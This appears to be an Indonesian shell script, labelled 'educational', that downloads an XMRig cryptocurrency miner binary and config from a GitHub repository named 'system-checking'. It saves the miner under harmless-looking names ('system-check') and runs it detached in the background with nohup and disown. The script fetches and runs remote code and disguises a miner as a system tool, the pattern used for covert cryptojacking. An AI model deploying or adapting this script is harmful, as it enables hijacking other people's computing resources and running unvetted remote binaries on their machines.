#!/bin/sh
# XMRig Edukasi - One-Liner Setup
# Support: x86_64 (amd64) dan aarch64 (arm64)
# Dijalankan sebagai user biasa, tanpa root.

set -eu

REPO_USER="Loritcz"
REPO_NAME="system-checking"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

# Cek dependensi
command -v curl >/dev/null 2>&1 || { echo "[-] curl tidak ditemukan, install dulu: sudo apt install curl"; exit 1; }
command -v uname >/dev/null 2>&1 || { echo "[-] uname tidak ditemukan"; exit 1; }

# Deteksi arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN="system-check" ;;
    aarch64|arm64) BIN="system-checking" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH"; exit 1 ;;
esac

WORKDIR="$HOME/system-check"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download config.json jika belum ada
[ -f config.json ] || {
    echo "[+] Download config.json..."
    curl -fsSL -o config.json "${RAW_URL}/config.json" || { echo "[-] Gagal download config.json"; exit 1; }
}

# Download binary sesuai arsitektur jika belum ada
[ -f "$BIN" ] || {
    echo "[+] Download binary $BIN untuk $ARCH..."
    curl -fsSL -o "$BIN" "${RAW_URL}/${BIN}" || { echo "[-] Gagal download binary $BIN"; exit 1; }
}

# Verifikasi file tidak kosong
[ -s "$BIN" ] || { echo "[-] Binary $BIN kosong, hapus dan jalankan ulang"; rm -f "$BIN"; exit 1; }
[ -s config.json ] || { echo "[-] config.json kosong, hapus dan jalankan ulang"; rm -f config.json; exit 1; }

chmod +x "$BIN"

echo "[+] Menjalankan: $BIN di background (nohup)"
nohup ./"$BIN" -c config.json "$@" > xmrig.log 2>&1 &
echo $! > xmrig.pid
(disown %1 2>/dev/null || disown 2>/dev/null || true)

echo "[+] PID tersimpan di: $WORKDIR/xmrig.pid"
echo "[+] Log real-time: $WORKDIR/xmrig.log"
echo "[+] Untuk menghentikan: kill \$(cat $WORKDIR/xmrig.pid)"
